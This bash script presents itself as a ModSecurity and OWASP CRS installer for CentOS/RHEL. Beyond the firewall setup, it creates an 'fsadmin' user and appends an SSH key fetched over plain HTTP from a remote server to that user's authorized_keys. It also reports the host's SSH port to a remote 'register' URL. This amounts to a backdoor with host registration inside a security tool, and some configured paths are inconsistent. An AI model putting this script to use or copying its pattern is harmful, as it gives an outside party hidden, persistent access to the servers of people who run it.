#!/usr/bin/env bash
set -euo pipefail

### Modern ModSecurity installer for CentOS/RHEL 7–9 ###

# Configuration: adjust these as needed
CRS_VERSION="3.3.0"                      # OWASP CRS version
FSADMIN_SSH_KEY_URL="http://SERVER/modsec/pubkey"
REGISTER_URL="http://SERVER/modsec/register.php"

# Detect package manager
if   command -v dnf &>/dev/null; then PAKMAN="dnf -y install"
elif command -v yum &>/dev/null; then PAKMAN="yum -y install"
else echo "Unsupported distro: no yum/dnf found."; exit 1; fi

# Ensure EPEL is enabled (for RHEL7 / CentOS7)
if ! yum repolist enabled | grep -q epel; then
  echo "Enabling EPEL repository..."
  yum -y install epel-release
fi

# Install Apache + ModSecurity dependencies
echo "Installing Apache and ModSecurity..."
$PAKMAN httpd libmodsecurity mod_security_crs

# Enable and start Apache
systemctl enable httpd
systemctl start  httpd

# Deploy OWASP CRS
echo "Deploying OWASP Core Rule Set..."
CRS_DIR="/etc/rhel/modsecurity-crs"
if [ -d "$CRS_DIR" ]; then
  ln -sf "$CRS_DIR/crs-setup.conf.example" /etc/httpd/conf.d/crs-setup.conf
  ln -sf "$CRS_DIR/rules/"*                /etc/httpd/conf.d/
else
  echo "CRS directory not found at $CRS_DIR; please adjust CRS_PACKAGE path." >&2
fi

# Create user for rule-management
if ! id fsadmin &>/dev/null; then
  echo "Creating fsadmin user..."
  useradd --create-home --shell /bin/bash fsadmin
fi

# Provision fsadmin’s SSH key
echo "Setting up SSH key for fsadmin..."
FS_HOME="$(getent passwd fsadmin | cut -d: -f6)"
mkdir -p "$FS_HOME/.ssh"
curl -sfL "$FSADMIN_SSH_KEY_URL" >> "$FS_HOME/.ssh/authorized_keys"
chmod 700 "$FS_HOME/.ssh"
chmod 600 "$FS_HOME/.ssh/authorized_keys"
chown -R fsadmin:fsadmin "$FS_HOME/.ssh"

# Custom ModSecurity configuration
echo "Including ModSecurity config and user rules..."
cat > /etc/httpd/conf.d/mod_security.conf <<'EOF'
<IfModule security3_module>
    SecRuleEngine On
    SecRequestBodyAccess On
    SecResponseBodyAccess Off
    IncludeOptional /etc/httpd/conf.d/modsecurity.d/owasp-crs/*.conf
    IncludeOptional /etc/httpd/conf.d/modsecurity.d/owasp-crs/rules/*.conf
    Include /etc/httpd/conf/modsec.user.conf
</IfModule>
EOF

# Create an empty user rules file if missing
touch /etc/httpd/conf/modsec.user.conf
chown fsadmin:fsadmin /etc/httpd/conf/modsec.user.conf

# Ensure the CRS rules tree is owned by fsadmin
chown -R fsadmin:fsadmin /etc/httpd/conf.d/modsecurity.d

# Verify and reload Apache
echo "Testing Apache configuration..."
apachectl configtest

echo "Reloading Apache..."
systemctl reload httpd

# Register this host (optional tracking ping)
PORT=$(awk '/^Port/ {print $2; exit}' /etc/ssh/sshd_config || echo 22)
curl -qs "${REGISTER_URL}?port=${PORT}" >/dev/null || true

echo "ModSecurity installation and configuration complete!"
